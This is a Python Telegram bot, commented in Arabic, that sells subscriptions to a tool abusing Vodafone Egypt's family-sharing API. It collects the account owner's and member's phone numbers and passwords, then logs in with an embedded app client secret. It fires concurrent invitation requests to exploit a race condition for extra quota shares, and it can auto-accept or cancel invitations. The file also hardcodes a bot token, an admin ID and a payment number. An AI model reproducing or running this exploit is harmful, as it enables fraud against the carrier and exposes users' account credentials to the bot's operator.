import os
import sys
import asyncio
import aiohttp
import json
import random
import telebot
from telebot import types
from datetime import datetime, timedelta
import pytz
from threading import Thread

# ====================================================================
# 1. الإعدادات والبيانات
# ====================================================================

BOT_TOKEN = "8918540263:AAFtZKNYqVAgcdY0HEVmyrZPhym3_NJKe2E"
ADMIN_ID = 1906886647 
CHANNEL_USERNAME = "@dollar7788" 
CHANNEL_URL = "https://t.me/dollar7788"
EGYPT_TZ = pytz.timezone('Africa/Cairo')

USERS_FILE = "bot_users.json"
CONFIG_FILE = "bot_config.json"
PENDING_REQUESTS_FILE = "pending_requests.json"

SUBSCRIPTION_PLANS = {
    "1": {"name": "اشتراك يوم", "price": 15, "days": 1},
    "2": {"name": "اشتراك 10 أيام", "price": 80, "days": 10},
    "3": {"name": "اشتراك شهر", "price": 150, "days": 30},
}

def load_data():
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, 'r', encoding='utf-8') as f: return json.load(f)
        except: return {}
    return {}

def save_data(data):
    with open(USERS_FILE, 'w', encoding='utf-8') as f: json.dump(data, f, ensure_ascii=False, indent=2)

def load_pending_requests():
    if os.path.exists(PENDING_REQUESTS_FILE):
        try:
            with open(PENDING_REQUESTS_FILE, 'r', encoding='utf-8') as f: return json.load(f)
        except: return []
    return []

def save_pending_requests(requests):
    with open(PENDING_REQUESTS_FILE, 'w', encoding='utf-8') as f: json.dump(requests, f, ensure_ascii=False, indent=2)

def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r', encoding='utf-8') as f: return json.load(f)
        except: pass
    return {"is_free": False, "total_ops": 0}

def save_config(config):
    with open(CONFIG_FILE, 'w', encoding='utf-8') as f: json.dump(config, f, ensure_ascii=False, indent=2)

USERS = load_data()
CONFIG = load_config()
PENDING_REQUESTS = load_pending_requests()
bot = telebot.TeleBot(BOT_TOKEN)
ACTIVE_OPERATIONS = {}

# ====================================================================
# 2. التحقق والاشتراك
# ====================================================================

def check_channel_sub(user_id):
    if user_id == ADMIN_ID: return True
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        if member.status in ['member', 'administrator', 'creator']: return True
    except: pass
    return False

def subscription_required(func):
    def wrapper(message):
        if not check_channel_sub(message.from_user.id):
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("📢 انضم للقناة من هنا", url=CHANNEL_URL))
            markup.add(types.InlineKeyboardButton("✅ تم الانضمام", callback_data="check_sub"))
            bot.send_message(message.chat.id, f"⚠️ يجب عليك الانضمام لقناة البوت أولاً لاستخدامه!\nرابط القناة: {CHANNEL_URL}", reply_markup=markup)
            return
        return func(message)
    return wrapper

def get_cancel_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("🛑 إلغاء العملية")
    return markup

def is_paid_user(user_id):
    if user_id == ADMIN_ID or CONFIG["is_free"]: return True
    user = USERS.get(str(user_id))
    if not user or "expire_date" not in user: return False
    expire_date = datetime.fromisoformat(user["expire_date"])
    return datetime.now(EGYPT_TZ) < expire_date

# ====================================================================
# 3. منطق التطير V4 (أقصى سرعة تزامن)
# ====================================================================

CLIENT_SECRET = '95fd95fb-7489-4958-8ae6-d31a525cd20a'
CLIENT_ID = 'ana-vodafone-app'

def get_headers(msisdn, is_web=True):
    clean_msisdn = msisdn if msisdn.startswith("0") else "0" + msisdn.replace("201", "01").replace("20", "")
    if is_web:
        return {"msisdn": clean_msisdn, "Accept": "application/json", "Content-Type": "application/json; charset=UTF-8", "User-Agent": "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0", "Origin": "https://web.vodafone.com.eg", "Referer": "https://web.vodafone.com.eg/spa/familySharing", "clientId": "WebsiteConsumer"}
    return {"msisdn": clean_msisdn, "Accept": "application/json", "Content-Type": "application/json; charset=UTF-8", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1", "Origin": "https://mobile.vodafone.com.eg", "Referer": "https://mobile.vodafone.com.eg/spa/familySharing", "clientId": "AnaVodafoneAndroid"}

async def login_async(session, phone, password):
    url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
    payload = {'grant_type': "password", 'username': phone, 'password': password, 'client_secret': CLIENT_SECRET, 'client_id': CLIENT_ID}
    headers = {'User-Agent': "okhttp/4.12.0", 'clientId': "AnaVodafoneAndroid"}
    for _ in range(2):
        try:
            async with session.post(url, data=payload, headers=headers, timeout=25) as response:
                if response.status == 200: return (await response.json()).get('access_token')
        except:
            await asyncio.sleep(1)
            continue
    return None

async def invite_send_v4(session, token, owner, member, quota, is_web=True):
    url = "https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup" if is_web else "https://mobile.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
    payload = {"name": "FlexFamily", "type": "SendInvitation", "category": [{"value": "523", "listHierarchyId": "PackageID"}, {"value": "47", "listHierarchyId": "TemplateID"}, {"value": "523", "listHierarchyId": "TierID"}, {"value": "percentage", "listHierarchyId": "familybehavior"}], "parts": {"member": [{"id": [{"value": owner, "schemeName": "MSISDN"}], "type": "Owner"}, {"id": [{"value": member, "schemeName": "MSISDN"}], "type": "Member"}], "characteristicsValue": {"characteristicsValue": [{"characteristicName": "quotaDist1", "value": str(quota), "type": "percentage"}]}}}
    headers = get_headers(owner, is_web); headers["Authorization"] = f"Bearer {token}"
    try:
        async with session.post(url, json=payload, headers=headers, timeout=30) as r: 
            return r.status in [200, 201, 204], await r.text()
    except: return False, "error"

async def remove_member_async(session, token, owner, member):
    o_num = owner if owner.startswith("2") else "2" + owner
    m_num = member if member.startswith("2") else "2" + member
    payload_remove = {"category": [{"listHierarchyId": "TemplateID", "value": "47"}], "parts": {"member": [{"id": [{"schemeName": "MSISDN", "value": o_num}], "type": "Owner"}, {"id": [{"schemeName": "MSISDN", "value": m_num}], "type": "Member"}]}, "type": "FamilyRemoveMember"}
    payload_cancel = {"category": [{"listHierarchyId": "TemplateID", "value": "47"}], "parts": {"member": [{"id": [{"schemeName": "MSISDN", "value": o_num}], "type": "Owner"}, {"id": [{"schemeName": "MSISDN", "value": m_num}], "type": "Member"}]}, "type": "CancelInvitation"}
    headers = get_headers(owner, True); headers["Authorization"] = f"Bearer {token}"
    attempts = [("POST", "https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup", payload_cancel), ("DELETE", "https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup", payload_remove), ("POST", "https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup", payload_remove), ("DELETE", "https://web.vodafone.com.eg/services/dxl/cg/manageFamilyAPI/manageFamily", payload_remove), ("POST", "https://web.vodafone.com.eg/services/dxl/cg/manageFamilyAPI/manageFamily", payload_remove)]
    all_resps = []
    try:
        for method, url, p in attempts:
            try:
                if method == "DELETE":
                    async with session.delete(url, headers=headers, json=p, timeout=15) as r:
                        if r.status in [200, 201, 204]: return True, await r.text()
                        all_resps.append(f"{method}: {r.status}")
                else:
                    async with session.post(url, headers=headers, json=p, timeout=15) as r:
                        if r.status in [200, 201, 204]: return True, await r.text()
                        all_resps.append(f"{method}: {r.status}")
            except: continue
        return False, " | ".join(all_resps)
    except Exception as e: return False, str(e)

async def accept_invitation_async(session, token, owner, member):
    url = "https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
    payload = {"category": [{"listHierarchyId": "TemplateID", "value": "47"}], "name": "FlexFamily", "parts": {"member": [{"id": [{"schemeName": "MSISDN", "value": owner}], "type": "Owner"}, {"id": [{"schemeName": "MSISDN", "value": member}], "type": "Member"}]}, "type": "AcceptInvitation"}
    headers = get_headers(member, True); headers["Authorization"] = f"Bearer {token}"
    try:
        async with session.patch(url, headers=headers, json=payload, timeout=20) as r: return r.status in [200, 201, 204]
    except: return False

# ====================================================================
# 4. تدفق العملية
# ====================================================================

def get_main_keyboard(user_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("🚀 بدء عملية جديدة")
    markup.add("👤 حسابي", "💳 تجديد الاشتراك")
    if user_id == ADMIN_ID: markup.add("⚙️ لوحة الإدارة")
    return markup

@bot.message_handler(func=lambda m: m.text == "🛑 إلغاء العملية")
def cancel_global(message):
    user_id = message.from_user.id
    ACTIVE_OPERATIONS.pop(user_id, None)
    bot.clear_step_handler_by_chat_id(message.chat.id)
    bot.send_message(message.chat.id, "🛑 تم إلغاء العملية والعودة للقائمة الرئيسية.", reply_markup=get_main_keyboard(user_id))

@bot.message_handler(commands=['start'])
def start(message):
    user_id = str(message.from_user.id)
    if user_id not in USERS:
        USERS[user_id] = {"joined": datetime.now(EGYPT_TZ).isoformat(), "expire_date": datetime.now(EGYPT_TZ).isoformat()}
        save_data(USERS)
    bot.send_message(message.chat.id, f"👋 أهلاً بك في بوت التطير والتعليق المطور!\n\n📢 قناة البوت: {CHANNEL_URL}", reply_markup=get_main_keyboard(message.from_user.id))

@bot.message_handler(func=lambda m: m.text == "🚀 بدء عملية جديدة")
@subscription_required
def start_op(message):
    if not is_paid_user(message.from_user.id):
        bot.send_message(message.chat.id, "⚠️ عذراً، يجب أن يكون لديك اشتراك مفعل لاستخدام البوت.")
        return
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add("✅قبول تلقائي", "⭕تعليق دعوتين")
    markup.add("🛑 إلغاء العملية")
    bot.send_message(message.chat.id, "🔄 اختر نوع العملية أولاً:", reply_markup=markup)
    bot.register_next_step_handler(message, get_owner_num)

def get_owner_num(message):
    if message.text == "🛑 إلغاء العملية": return cancel_global(message)
    op_type = message.text.strip()
    if op_type not in ["✅قبول تلقائي", "⭕تعليق دعوتين"]:
        bot.send_message(message.chat.id, "❌ اختيار غير صحيح.")
        return
    bot.send_message(message.chat.id, "📱 أدخل رقم الأونر (المالك):", reply_markup=get_cancel_keyboard())
    bot.register_next_step_handler(message, get_owner_pass, op_type)

def get_owner_pass(message, op_type):
    if message.text == "🛑 إلغاء العملية": return cancel_global(message)
    owner_num = message.text.strip()
    bot.send_message(message.chat.id, "🔒 أدخل باسورد الأونر:", reply_markup=get_cancel_keyboard())
    bot.register_next_step_handler(message, get_member_num, op_type, owner_num)

def get_member_num(message, op_type, owner_num):
    if message.text == "🛑 إلغاء العملية": return cancel_global(message)
    owner_pass = message.text.strip()
    bot.send_message(message.chat.id, "👥 أدخل رقم الفرد:", reply_markup=get_cancel_keyboard())
    bot.register_next_step_handler(message, get_member_pass, op_type, owner_num, owner_pass)

def get_member_pass(message, op_type, owner_num, owner_pass):
    if message.text == "🛑 إلغاء العملية": return cancel_global(message)
    member_num = message.text.strip()
    bot.send_message(message.chat.id, "🔑 أدخل باسورد الفرد:", reply_markup=get_cancel_keyboard())
    bot.register_next_step_handler(message, get_quota, op_type, owner_num, owner_pass, member_num)

def get_quota(message, op_type, owner_num, owner_pass, member_num):
    if message.text == "🛑 إلغاء العملية": return cancel_global(message)
    member_pass = message.text.strip()
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add("10", "20", "40")
    markup.add("🛑 إلغاء العملية")
    bot.send_message(message.chat.id, "📊 اختر النسبة (10, 20, 40):", reply_markup=markup)
    bot.register_next_step_handler(message, run_operation, op_type, owner_num, owner_pass, member_num, member_pass)

def run_operation(message, op_type, owner_num, owner_pass, member_num, member_pass):
    if message.text == "🛑 إلغاء العملية": return cancel_global(message)
    quota = message.text.strip()
    Thread(target=lambda: asyncio.run(run_op_async(message.chat.id, message.from_user.id, owner_num, owner_pass, member_num, member_pass, quota, op_type))).start()

# ====================================================================
# 5. تنفيذ العملية المحسنة (أقصى سرعة تزامن)
# ====================================================================

async def run_op_async(chat_id, user_id, owner_num, owner_pass, member_num, member_pass, quota, op_type):
    ACTIVE_OPERATIONS[user_id] = True
    bot.send_message(chat_id, "⏳ جاري البدء بأقصى سرعة إرسال...", reply_markup=get_main_keyboard(user_id))
    
    cancel_markup = types.InlineKeyboardMarkup()
    cancel_markup.add(types.InlineKeyboardButton("🛑 إلغاء العملية", callback_data="cancel_op"))
    msg = bot.send_message(chat_id, "🔑 جاري تسجيل الدخول...", reply_markup=cancel_markup)
    
    # تحسين الـ Connector لسرعة قصوى
    connector = aiohttp.TCPConnector(limit=100, ttl_dns_cache=600, ssl=False, force_close=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        login_tasks = [login_async(session, owner_num, owner_pass), login_async(session, member_num, member_pass)]
        o_token, m_token = await asyncio.gather(*login_tasks)
        
        if not o_token or not m_token:
            bot.edit_message_text("❌ فشل الدخول. تأكد من البيانات.", chat_id, msg.message_id)
            ACTIVE_OPERATIONS.pop(user_id, None); return

        success_count = 0
        last_resp = ""
        
        # تجهيز الهيدرز والبيانات مسبقاً لتقليل وقت المعالجة داخل الحلقة
        h_web = get_headers(owner_num, True); h_web["Authorization"] = f"Bearer {o_token}"
        h_app = get_headers(owner_num, False); h_app["Authorization"] = f"Bearer {o_token}"
        url_web = "https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
        url_app = "https://mobile.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
        payload = {"name": "FlexFamily", "type": "SendInvitation", "category": [{"value": "523", "listHierarchyId": "PackageID"}, {"value": "47", "listHierarchyId": "TemplateID"}, {"value": "523", "listHierarchyId": "TierID"}, {"value": "percentage", "listHierarchyId": "familybehavior"}], "parts": {"member": [{"id": [{"value": owner_num, "schemeName": "MSISDN"}], "type": "Owner"}, {"id": [{"value": member_num, "schemeName": "MSISDN"}], "type": "Member"}], "characteristicsValue": {"characteristicsValue": [{"characteristicName": "quotaDist1", "value": str(quota), "type": "percentage"}]}}}

        for i in range(1, 11):
            if user_id not in ACTIVE_OPERATIONS:
                bot.edit_message_text("🛑 تم إلغاء العملية.", chat_id, msg.message_id); return
            
            bot.edit_message_text(f"🚀 ضرب رباعي فائق السرعة (محاولة {i})...", chat_id, msg.message_id, reply_markup=cancel_markup)
            
            # الضرب الرباعي بأقل تأخير ممكن (بدون استدعاء دوال فرعية لتقليل الـ Overhead)
            async def fast_post(url, headers):
                try:
                    async with session.post(url, json=payload, headers=headers, timeout=10) as r:
                        return r.status in [200, 201, 204], await r.text()
                except: return False, "error"

            tasks = [
                fast_post(url_web, h_web),
                fast_post(url_web, h_web),
                fast_post(url_app, h_app),
                fast_post(url_app, h_app)
            ]
            
            results = await asyncio.gather(*tasks)
            success_count = sum(1 for s, m in results if s)
            
            if success_count >= 2: break
            
            if success_count == 1:
                bot.edit_message_text(f"⚠️ نجحت دعوة واحدة! جاري الانتظار 15 ثانية للإلغاء...", chat_id, msg.message_id, reply_markup=cancel_markup)
                await asyncio.sleep(15)
                if user_id not in ACTIVE_OPERATIONS: return
                success_cancel, cancel_resp = await remove_member_async(session, o_token, owner_num, member_num)
                if success_cancel:
                    await asyncio.sleep(2)
                else:
                    bot.edit_message_text(f"❌ فشل الإلغاء. تم الإيقاف للسلامة.", chat_id, msg.message_id)
                    ACTIVE_OPERATIONS.pop(user_id, None); return
            else:
                last_resp = results[0][1]
                if "rate limit" in last_resp.lower():
                    await asyncio.sleep(30)
                else:
                    await asyncio.sleep(2)

        if success_count < 2:
            bot.edit_message_text(f"❌ فشل بعد 10 محاولات.", chat_id, msg.message_id)
            ACTIVE_OPERATIONS.pop(user_id, None); return

        if op_type == "⭕تعليق دعوتين":
            bot.edit_message_text(f"✅ نجح التعليق ({success_count} دعوات)! 🎯", chat_id, msg.message_id)
            CONFIG["total_ops"] += 1; save_config(CONFIG)
        else:
            bot.edit_message_text("✅ تم الإرسال. جاري القبول التلقائي...", chat_id, msg.message_id, reply_markup=cancel_markup)
            await asyncio.sleep(60) # تقليل وقت الانتظار للقبول
            if user_id in ACTIVE_OPERATIONS and await accept_invitation_async(session, m_token, owner_num, member_num):
                bot.edit_message_text("✅ تم القبول بنجاح!", chat_id, msg.message_id)
                CONFIG["total_ops"] += 1; save_config(CONFIG)
            else:
                bot.edit_message_text("❌ فشل القبول التلقائي.", chat_id, msg.message_id)
            
    ACTIVE_OPERATIONS.pop(user_id, None)

# باقي دوال الإدارة والاشتراكات كما هي دون تغيير
def process_payment_number(message, plan_key):
    user_id = str(message.from_user.id); payment_number = message.text.strip(); plan = SUBSCRIPTION_PLANS.get(plan_key)
    if not plan: return
    request_id = int(datetime.now().timestamp())
    PENDING_REQUESTS.append({"id": request_id, "user_id": user_id, "username": message.from_user.username or "N/A", "plan_name": plan["name"], "price": plan["price"], "payment_number": payment_number, "timestamp": datetime.now(EGYPT_TZ).isoformat()})
    save_pending_requests(PENDING_REQUESTS)
    bot.send_message(message.chat.id, "✅ تم استلام طلبك. جاري مراجعة طلبك من خلال الإدارة.", reply_markup=get_main_keyboard(user_id))
    admin_markup = types.InlineKeyboardMarkup()
    admin_markup.add(types.InlineKeyboardButton("✅ قبول", callback_data=f"approve_request_{request_id}"), types.InlineKeyboardButton("❌ رفض", callback_data=f"reject_request_{request_id}"))
    bot.send_message(ADMIN_ID, f"🔔 طلب اشتراك جديد من {user_id}", reply_markup=admin_markup)

def approve_subscription_request(message, request_id):
    req = next((r for r in PENDING_REQUESTS if r['id'] == request_id), None)
    if req:
        PENDING_REQUESTS.remove(req); save_pending_requests(PENDING_REQUESTS)
        user_id = str(req['user_id']); plan_days = next((p['days'] for p in SUBSCRIPTION_PLANS.values() if p['name'] == req['plan_name']), 0)
        if user_id not in USERS: USERS[user_id] = {"joined": datetime.now(EGYPT_TZ).isoformat(), "expire_date": datetime.now(EGYPT_TZ).isoformat()}
        current = datetime.fromisoformat(USERS[user_id]["expire_date"])
        new_expire = (max(current, datetime.now(EGYPT_TZ)) + timedelta(days=plan_days)).isoformat()
        USERS[user_id]["expire_date"] = new_expire; save_data(USERS)
        bot.send_message(user_id, f"🎉 تم تفعيل اشتراكك!")

def reject_subscription_request(message, request_id):
    req = next((r for r in PENDING_REQUESTS if r['id'] == request_id), None)
    if req: PENDING_REQUESTS.remove(req); save_pending_requests(PENDING_REQUESTS); bot.send_message(req['user_id'], "❌ تم رفض طلبك.")

def display_pending_requests(message):
    if not PENDING_REQUESTS: bot.send_message(message.chat.id, "لا توجد طلبات معلقة."); return
    for req in PENDING_REQUESTS:
        m = types.InlineKeyboardMarkup(); m.add(types.InlineKeyboardButton("✅ قبول", callback_data=f"approve_request_{req['id']}"), types.InlineKeyboardButton("❌ رفض", callback_data=f"reject_request_{req['id']}"))
        bot.send_message(message.chat.id, f"ID: {req['id']}\nUser: {req['user_id']}\nPlan: {req['plan_name']}", reply_markup=m)

def add_sub_manual(message):
    try:
        uid, days = message.text.split(); expire = datetime.now(EGYPT_TZ) + timedelta(days=int(days))
        if uid not in USERS: USERS[uid] = {"joined": datetime.now(EGYPT_TZ).isoformat()}
        USERS[uid]["expire_date"] = expire.isoformat(); save_data(USERS); bot.send_message(message.chat.id, "✅ تم.")
    except: bot.send_message(message.chat.id, "❌ خطأ.")

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    uid = call.from_user.id
    if call.data == "check_sub":
        if check_channel_sub(uid): bot.answer_callback_query(call.id, "✅"); bot.delete_message(call.message.chat.id, call.message.message_id); start(call.message)
        else: bot.answer_callback_query(call.id, "❌", show_alert=True)
    elif call.data == "cancel_op": ACTIVE_OPERATIONS.pop(uid, None); bot.answer_callback_query(call.id, "🛑")
    elif call.data == "toggle_free" and uid == ADMIN_ID: CONFIG["is_free"] = not CONFIG["is_free"]; save_config(CONFIG); admin_panel(call.message)
    elif call.data.startswith("sub_plan_"):
        pk = call.data.split("_")[2]; p = SUBSCRIPTION_PLANS.get(pk)
        if p: bot.send_message(call.message.chat.id, f"💳 حول {p['price']} لـ 01026292411 وارسل رقمك هنا."); bot.register_next_step_handler(call.message, process_payment_number, pk)
    elif call.data == "view_pending_requests" and uid == ADMIN_ID: display_pending_requests(call.message)
    elif call.data.startswith("approve_request_"): approve_subscription_request(call.message, int(call.data.split("_")[2]))
    elif call.data.startswith("reject_request_"): reject_subscription_request(call.message, int(call.data.split("_")[2]))
    elif call.data == "add_sub" and uid == ADMIN_ID: bot.send_message(call.message.chat.id, "UID Days:"); bot.register_next_step_handler(call.message, add_sub_manual)

@bot.message_handler(func=lambda m: m.text == "⚙️ لوحة الإدارة" and m.from_user.id == ADMIN_ID)
def admin_panel(message):
    m = types.InlineKeyboardMarkup(); m.add(types.InlineKeyboardButton(f"الوضع: {'مجاني' if CONFIG['is_free'] else 'مدفوع'}", callback_data="toggle_free"), types.InlineKeyboardButton("إضافة يدوي", callback_data="add_sub")); m.add(types.InlineKeyboardButton(f"الطلبات: {len(PENDING_REQUESTS)}", callback_data="view_pending_requests")); bot.send_message(message.chat.id, "🛠️ لوحة التحكم:", reply_markup=m)

@bot.message_handler(func=lambda m: m.text == "💳 تجديد الاشتراك")
def renew_sub(message):
    m = types.InlineKeyboardMarkup()
    for k, p in SUBSCRIPTION_PLANS.items(): m.add(types.InlineKeyboardButton(f"{p['name']}: {p['price']} ج", callback_data=f"sub_plan_{k}"))
    bot.send_message(message.chat.id, "💰 الخطط:", reply_markup=m)

@bot.message_handler(func=lambda m: m.text == "👤 حسابي")
def my_account(message):
    u = USERS.get(str(message.from_user.id))
    if not u or "expire_date" not in u: bot.send_message(message.chat.id, "لا يوجد اشتراك."); return
    exp = datetime.fromisoformat(u["expire_date"]); s = "✅ مفعل" if datetime.now(EGYPT_TZ) < exp else "❌ منتهي"
    bot.send_message(message.chat.id, f"🆔 ID: {message.from_user.id}\n📅 ينتهي: {exp.strftime('%Y-%m-%d')}\n📊 الحالة: {s}")

if __name__ == "__main__":
    print("🤖 البوت يعمل الآن...")
    bot.polling(none_stop=True)
